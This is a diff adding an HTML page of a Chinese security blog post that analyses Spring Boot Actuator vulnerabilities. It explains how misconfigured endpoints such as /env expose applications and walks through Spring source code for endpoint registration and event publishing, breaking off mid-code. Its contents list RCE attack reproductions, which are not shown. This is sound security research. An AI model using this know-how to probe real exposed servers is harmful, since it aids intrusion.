@@ -1,0 +1,1063 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>springboot_actuator漏洞分析 - P1n93r - 博学而精一</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="P1n93r" /><meta name="description" content="简介 Spring-Actuator是Spring-boot对应用监控的集成模块,提供了我们对服务器进行监控的支持,使我们更直观的获取应用程序" /><meta name="keywords" content="Security, Java, Web, Android" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.96.0 with theme even" />
+
+
+<link rel="canonical" href="https://p1n93r.github.io/post/security/springboot_actuator%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<link href="/sass/main.min.f92fd13721ddf72129410fd8250e73152cc6f2438082b6c0208dc24ee7c13fc4.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:title" content="springboot_actuator漏洞分析" />
+<meta property="og:description" content="简介 Spring-Actuator是Spring-boot对应用监控的集成模块,提供了我们对服务器进行监控的支持,使我们更直观的获取应用程序" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://p1n93r.github.io/post/security/springboot_actuator%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2021-06-15T17:07:36+08:00" />
+<meta property="article:modified_time" content="2021-06-15T17:07:36+08:00" />
+
+<meta itemprop="name" content="springboot_actuator漏洞分析">
+<meta itemprop="description" content="简介 Spring-Actuator是Spring-boot对应用监控的集成模块,提供了我们对服务器进行监控的支持,使我们更直观的获取应用程序"><meta itemprop="datePublished" content="2021-06-15T17:07:36+08:00" />
+<meta itemprop="dateModified" content="2021-06-15T17:07:36+08:00" />
+<meta itemprop="wordCount" content="3954">
+<meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="springboot_actuator漏洞分析"/>
+<meta name="twitter:description" content="简介 Spring-Actuator是Spring-boot对应用监控的集成模块,提供了我们对服务器进行监控的支持,使我们更直观的获取应用程序"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">P1n93r</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="/categories/">
+        <li class="mobile-menu-item">Categories</li>
+      </a><a href="/about/">
+        <li class="mobile-menu-item">About</li>
+      </a>
+  </ul>
+
+  
+
+
+</nav>
+
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">P1n93r</a>
+</div>
+
+
+
+
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/categories/">Categories</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/about/">About</a>
+      </li>
+  </ul>
+</nav>
+
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">springboot_actuator漏洞分析</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2021-06-15 </span>
+        <div class="post-category">
+            <a href="/categories/security/"> security </a>
+            </div>
+          <span class="more-meta"> 约 3954 字 </span>
+          <span class="more-meta"> 预计阅读 8 分钟 </span>
+        <span id="busuanzi_container_page_pv" class="more-meta"> <span id="busuanzi_value_page_pv"><img src="/img/spinner.svg" alt="spinner.svg"/></span> 次阅读 </span>
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content always-active">
+    <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#简介">简介</a></li>
+        <li><a href="#前置知识">前置知识</a>
+          <ul>
+            <li><a href="#actuator请求处理流程分析">Actuator请求处理流程分析</a></li>
+            <li><a href="#spring事件通知机制">Spring事件通知机制</a></li>
+          </ul>
+        </li>
+        <li><a href="#snakeyaml-rce">SnakeYaml RCE</a>
+          <ul>
+            <li><a href="#攻击复现">攻击复现</a></li>
+            <li><a href="#漏洞原理">漏洞原理</a></li>
+            <li><a href="#流量特征">流量特征</a></li>
+          </ul>
+        </li>
+        <li><a href="#eureka-xstream-rce">Eureka Xstream RCE</a>
+          <ul>
+            <li><a href="#攻击复现-1">攻击复现</a></li>
+            <li><a href="#漏洞原理-1">漏洞原理</a></li>
+            <li><a href="#流量特征-1">流量特征</a></li>
+          </ul>
+        </li>
+        <li><a href="#jolokia-logback-jndi-rce">Jolokia Logback JNDI RCE</a>
+          <ul>
+            <li><a href="#攻击复现-2">攻击复现</a></li>
+            <li><a href="#漏洞原理-2">漏洞原理</a></li>
+            <li><a href="#流量特征-2">流量特征</a></li>
+          </ul>
+        </li>
+        <li><a href="#总结">总结</a></li>
+        <li><a href="#参考">参考</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      <h2 id="简介">简介</h2>
+<p>Spring-Actuator是Spring-boot对应用监控的集成模块,提供了我们对服务器进行监控的支持,使我们更直观的获取应用程序中加载的应用配置、环境变量、自动化配置报告等。</p>
+<p>我们只需在pom文件中加入如下配置即可引入Actuator：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;groupId&gt;</span>org.springframework.boot<span class="nt">&lt;/groupId&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;artifactId&gt;</span>spring-boot-starter-actuator<span class="nt">&lt;/artifactId&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependency&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>应用启动后，此时我们可以访问一些类似 <code>/env</code> 、 <code>/health</code> 等接口来获取应用的环境信息等。</p>
+<p>如果Spring Boot Actuator配置不当，一些敏感接口对外开放，轻则造成信息泄漏，重则RCE。Spring不同版本对于Actuator的区别如下：</p>
+<ul>
+<li>1.0 - 1.4之间，默认暴露actuator的所有接口。</li>
+<li>1.5 开始除 <code>/health</code>  和 <code>/info</code> 外，其他接口都默认有权限校验；</li>
+<li>2.x 版本的actuator存在路由前缀： <code>/actuator </code> ，并且 2.x 版本默认只启用 <code>/health</code>  和 <code>/info</code> ；</li>
+</ul>
+<p>当然，从1.5版本开始，如果程序员配置不当，开启了对外开放actuator的所有接口，那么就能造成漏洞了。</p>
+<h2 id="前置知识">前置知识</h2>
+<h3 id="actuator请求处理流程分析">Actuator请求处理流程分析</h3>
+<p>Actuator提供了很多端点（Endpoint），例如常见的 <code>DumpEndpoint</code>  、 <code>HealthEndpoint</code> 、 <code>BeansEndpoint</code> 等。但是这些端点无法通过HTTP直接请求到，要想访问这些端点，需要通过各个端点对应的 <code>XXXMvcEndpoint</code> 类来访问。</p>
+<p>我们知道，SpringMVC是通过 <code>RequestMappingHandlerMapping</code> 来注册 <code>Handler</code> 的，这些 <code>XXXMvcEndpoint</code> 便是通过一个叫做 <code>EndpointHandlerMapping</code> 的类来进行注册的。实际上，这个类就是继承于 <code>RequestMappingHandlerMapping</code> ，注册之后，我们就可以通过HTTP访问到这些端点了。</p>
+<p>我们首先看到 <code>org.springframework.boot.actuate.endpoint.mvc.EndpointHandlerMapping#afterPropertiesSet()</code> ：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kt">void</span> <span class="nf">afterPropertiesSet</span><span class="o">()</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">super</span><span class="o">.</span><span class="na">afterPropertiesSet</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">(!</span><span class="k">this</span><span class="o">.</span><span class="na">disabled</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Iterator</span> <span class="n">var1</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">endpoints</span><span class="o">.</span><span class="na">iterator</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="k">while</span><span class="o">(</span><span class="n">var1</span><span class="o">.</span><span class="na">hasNext</span><span class="o">())</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">MvcEndpoint</span> <span class="n">endpoint</span> <span class="o">=</span> <span class="o">(</span><span class="n">MvcEndpoint</span><span class="o">)</span><span class="n">var1</span><span class="o">.</span><span class="na">next</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">            <span class="k">this</span><span class="o">.</span><span class="na">detectHandlerMethods</span><span class="o">(</span><span class="n">endpoint</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到，这个函数的操作逻辑如下：</p>
+<ul>
+<li>先调用父类的 <code>afterPropertiesSet()</code> 方法；</li>
+<li>遍历 <code>endpoints</code> ，调用 <code>this.detectHandlerMethods()</code> 方法对当前遍历的 <code>MvcEndpoint</code> 进行注册。</li>
+</ul>
+<p>继续看到 <code>org.springframework.boot.actuate.endpoint.mvc.EndpointHandlerMapping#detectHandlerMethods(final Object handler)</code> :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">protected</span> <span class="kt">void</span> <span class="nf">detectHandlerMethods</span><span class="o">(</span><span class="kd">final</span> <span class="n">Object</span> <span class="n">handler</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">   <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">handlerType</span> <span class="o">=</span> <span class="o">(</span><span class="n">handler</span> <span class="k">instanceof</span> <span class="n">String</span> <span class="o">?</span>
+</span></span><span class="line"><span class="cl">         <span class="n">getApplicationContext</span><span class="o">().</span><span class="na">getType</span><span class="o">((</span><span class="n">String</span><span class="o">)</span> <span class="n">handler</span><span class="o">)</span> <span class="o">:</span> <span class="n">handler</span><span class="o">.</span><span class="na">getClass</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl">   <span class="kd">final</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">userType</span> <span class="o">=</span> <span class="n">ClassUtils</span><span class="o">.</span><span class="na">getUserClass</span><span class="o">(</span><span class="n">handlerType</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="n">Map</span><span class="o">&lt;</span><span class="n">Method</span><span class="o">,</span> <span class="n">T</span><span class="o">&gt;</span> <span class="n">methods</span> <span class="o">=</span> <span class="n">MethodIntrospector</span><span class="o">.</span><span class="na">selectMethods</span><span class="o">(</span><span class="n">userType</span><span class="o">,</span>
+</span></span><span class="line"><span class="cl">         <span class="k">new</span> <span class="n">MethodIntrospector</span><span class="o">.</span><span class="na">MetadataLookup</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;()</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nd">@Override</span>
+</span></span><span class="line"><span class="cl">            <span class="kd">public</span> <span class="n">T</span> <span class="nf">inspect</span><span class="o">(</span><span class="n">Method</span> <span class="n">method</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">               <span class="k">try</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                  <span class="k">return</span> <span class="n">getMappingForMethod</span><span class="o">(</span><span class="n">method</span><span class="o">,</span> <span class="n">userType</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">               <span class="o">}</span>
+</span></span><span class="line"><span class="cl">               <span class="k">catch</span> <span class="o">(</span><span class="n">Throwable</span> <span class="n">ex</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                  <span class="k">throw</span> <span class="k">new</span> <span class="n">IllegalStateException</span><span class="o">(</span><span class="s">&#34;Invalid mapping on handler class [&#34;</span> <span class="o">+</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">userType</span><span class="o">.</span><span class="na">getName</span><span class="o">()</span> <span class="o">+</span> <span class="s">&#34;]: &#34;</span> <span class="o">+</span> <span class="n">method</span><span class="o">,</span> <span class="n">ex</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">               <span class="o">}</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">         <span class="o">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="k">if</span> <span class="o">(</span><span class="n">logger</span><span class="o">.</span><span class="na">isDebugEnabled</span><span class="o">())</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">logger</span><span class="o">.</span><span class="na">debug</span><span class="o">(</span><span class="n">methods</span><span class="o">.</span><span class="na">size</span><span class="o">()</span> <span class="o">+</span> <span class="s">&#34; request handler methods found on &#34;</span> <span class="o">+</span> <span class="n">userType</span> <span class="o">+</span> <span class="s">&#34;: &#34;</span> <span class="o">+</span> <span class="n">methods</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">   <span class="o">}</span>
+</span></span><span class="line"><span class="cl">   <span class="k">for</span> <span class="o">(</span><span class="n">Map</span><span class="o">.</span><span class="na">Entry</span><span class="o">&lt;</span><span class="n">Method</span><span class="o">,</span> <span class="n">T</span><span class="o">&gt;</span> <span class="n">entry</span> <span class="o">:</span> <span class="n">methods</span><span class="o">.</span><span class="na">entrySet</span><span class="o">())</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">Method</span> <span class="n">invocableMethod</span> <span class="o">=</span> <span class="n">AopUtils</span><span class="o">.</span><span class="na">selectInvocableMethod</span><span class="o">(</span><span class="n">entry</span><span class="o">.</span><span class="na">getKey</span><span class="o">(),</span> <span class="n">userType</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">T</span> <span class="n">mapping</span> <span class="o">=</span> <span class="n">entry</span><span class="o">.</span><span class="na">getValue</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">      <span class="n">registerHandlerMethod</span><span class="o">(</span><span class="n">handler</span><span class="o">,</span> <span class="n">invocableMethod</span><span class="o">,</span> <span class="n">mapping</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">   <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个方法的大致逻辑如下：</p>
+<ul>
+<li>遍历当前Handler(也就是MvcEndpoint)的所有方法；</li>
+<li>从中找到标注有 <code>@RequestMapping</code> 等注解的方法，并根据注解配置的路由构造一个 <code>RequestMappingInfo</code> 对象，这个过程对应于上述代码中的 <code>getMappingForMethod(method, userType)</code> ;</li>
+<li>最后调用 <code>registerHandlerMethod(handler, invocableMethod, mapping)</code> ，将当前Handler(MvcEndpoint)中，含有 <code>@RequestMapping</code> 注解的方法进行路由注册。</li>
+</ul>
+<p>继续跟一下 <code>org.springframework.boot.actuate.endpoint.mvc.EndpointHandlerMapping#registerHandlerMethod(Object handler, Method method, RequestMappingInfo mapping)</code> :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">protected</span> <span class="kt">void</span> <span class="nf">registerHandlerMethod</span><span class="o">(</span><span class="n">Object</span> <span class="n">handler</span><span class="o">,</span> <span class="n">Method</span> <span class="n">method</span><span class="o">,</span> <span class="n">RequestMappingInfo</span> <span class="n">mapping</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">(</span><span class="n">mapping</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">String</span><span class="o">[]</span> <span class="n">patterns</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">getPatterns</span><span class="o">(</span><span class="n">handler</span><span class="o">,</span> <span class="n">mapping</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">super</span><span class="o">.</span><span class="na">registerHandlerMethod</span><span class="o">(</span><span class="n">handler</span><span class="o">,</span> <span class="n">method</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">withNewPatterns</span><span class="o">(</span><span class="n">mapping</span><span class="o">,</span> <span class="n">patterns</span><span class="o">));</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到，逻辑很简单，就是从 <code>RequestMappingInfo</code> 对象中拿到路由信息，然后将对应的方法注册一下就OK了。</p>
+<p>这里没有带着具体分析路由信息到底是如何获取的（太长了），这里就直接说明结论：</p>
+<p>Actuator的各个Endpoint的id属性就是路由。例如 <code>HealthEndpoint</code> ：</p>
+<p><img src="/media/image-20210819154447797.png" alt="image-20210819154447797"></p>
+<p>例如我们看到 <code>org.springframework.cloud.context.environment.EnvironmentManagerMvcEndpoint</code> ：</p>
+<p><img src="/media/image-20210819155216632.png" alt="image-20210819155216632"></p>
+<p>根据我们前面的MvcEndpoint注册分析，可以知道这个MvcEndpint对外暴露了两个方法，且都是POST类型的。路由为 <code>/env</code> 和 <code>/env/reset</code> ，为啥是 <code>/env</code> ，因为：</p>
+<p><img src="/media/image-20210819155433542.png" alt="image-20210819155433542"></p>
+<p>由此我们便可以通过HTTP访问到MvcEndpoint了，MvcEndpoint再操作其对应的Endpoint。</p>
+<h3 id="spring事件通知机制">Spring事件通知机制</h3>
+<p>Spring的事件通知机制是一项很有用的功能，使用事件机制我们可以将相互耦合的代码解耦，从而方便功能的修改与添加。</p>
+<p>我们已前面提到的 <code>org.springframework.cloud.context.environment.EnvironmentManagerMvcEndpoint</code> 类为例，分析Spring的事件通知机制。首先看到其 <code>value()</code> 方法：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@RequestMapping</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">&#34;&#34;</span><span class="o">,</span> <span class="n">method</span> <span class="o">=</span> <span class="n">RequestMethod</span><span class="o">.</span><span class="na">POST</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="nd">@ResponseBody</span>
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="n">Object</span> <span class="nf">value</span><span class="o">(</span><span class="nd">@RequestParam</span> <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">String</span><span class="o">&gt;</span> <span class="n">params</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">   <span class="k">for</span> <span class="o">(</span><span class="n">String</span> <span class="n">name</span> <span class="o">:</span> <span class="n">params</span><span class="o">.</span><span class="na">keySet</span><span class="o">())</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">environment</span><span class="o">.</span><span class="na">setProperty</span><span class="o">(</span><span class="n">name</span><span class="o">,</span> <span class="n">params</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">name</span><span class="o">));</span>
+</span></span><span class="line"><span class="cl">   <span class="o">}</span>
+</span></span><span class="line"><span class="cl">   <span class="k">return</span> <span class="n">params</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>从前端接收参数存入到params，再调用 <code>EnvironmentManager#setProperty()</code> 方法，往环境变量中设置参数值。继续跟进：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@ManagedOperation</span>
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kt">void</span> <span class="nf">setProperty</span><span class="o">(</span><span class="n">String</span> <span class="n">name</span><span class="o">,</span> <span class="n">String</span> <span class="n">value</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="k">if</span> <span class="o">(!</span><span class="n">environment</span><span class="o">.</span><span class="na">getPropertySources</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="n">MANAGER_PROPERTY_SOURCE</span><span class="o">))</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">      <span class="kd">synchronized</span> <span class="o">(</span><span class="n">map</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">         <span class="k">if</span> <span class="o">(!</span><span class="n">environment</span><span class="o">.</span><span class="na">getPropertySources</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="n">MANAGER_PROPERTY_SOURCE</span><span class="o">))</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">MapPropertySource</span> <span class="n">source</span> <span class="o">=</span> <span class="k">new</span> <span class="n">MapPropertySource</span><span class="o">(</span>
+</span></span><span class="line"><span class="cl">                  <span class="n">MANAGER_PROPERTY_SOURCE</span><span class="o">,</span> <span class="n">map</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">environment</span><span class="o">.</span><span class="na">getPropertySources</span><span class="o">().</span><span class="na">addFirst</span><span class="o">(</span><span class="n">source</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">         <span class="o">}</span>
+</span></span><span class="line"><span class="cl">      <span class="o">}</span>
+</span></span><span class="line"><span class="cl">   <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="k">if</span> <span class="o">(!</span><span class="n">value</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">environment</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="n">name</span><span class="o">)))</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">name</span><span class="o">,</span> <span class="n">value</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">publish</span><span class="o">(</span><span class="k">new</span> <span class="n">EnvironmentChangeEvent</span><span class="o">(</span><span class="n">Collections</span><span class="o">.</span><span class="na">singleton</span><span class="o">(</span><span class="n">name</span><span class="o">)));</span>
+</span></span><span class="line"><span class="cl">   <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>逻辑如下：</p>
+<ul>
+<li>调用 <code>environment.getPropertySources()</code> 获取所有属性源，判断是否存在 <code>manager</code> 属性源，没有的话，则创建一个添加到 <code>environment</code> 中；</li>
+<li>通过 <code>value.equals(environment.getProperty(name))</code> 判断 <code>environment</code> 中 <code>name</code> 对应的参数值是否和前端传来的一致，不一致则将前端传来的参数值设置到 <code>map</code> 中。这个 <code>map</code> 就是 <code>environment</code> 中名字为 <code>manager</code> 的属性源( <code>MapPropertySource</code> )的一个属性，用于存储配置。</li>
+<li>设置完毕属性，再通过 <code>publish(new EnvironmentChangeEvent(Collections.singleton(name)))</code> 将事件发布出去。</li>
+</ul>
+<p>最终底层是通过调用 <code>org.springframework.context.support.AbstractApplicationContext#publishEvent(Object event, ResolvableType eventType)</code> 来将事件发布出去，其中又是调用 <code>SimpleApplicationEventMulticaster#multicastEvent()</code> 方法来将事件广播出去：</p>
+<p><img src="/media/image-20210819161433134.png" alt="image-20210819161433134"></p>
+<p>继续跟进 <code>SimpleApplicationEventMulticaster#multicastEvent()</code> ：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
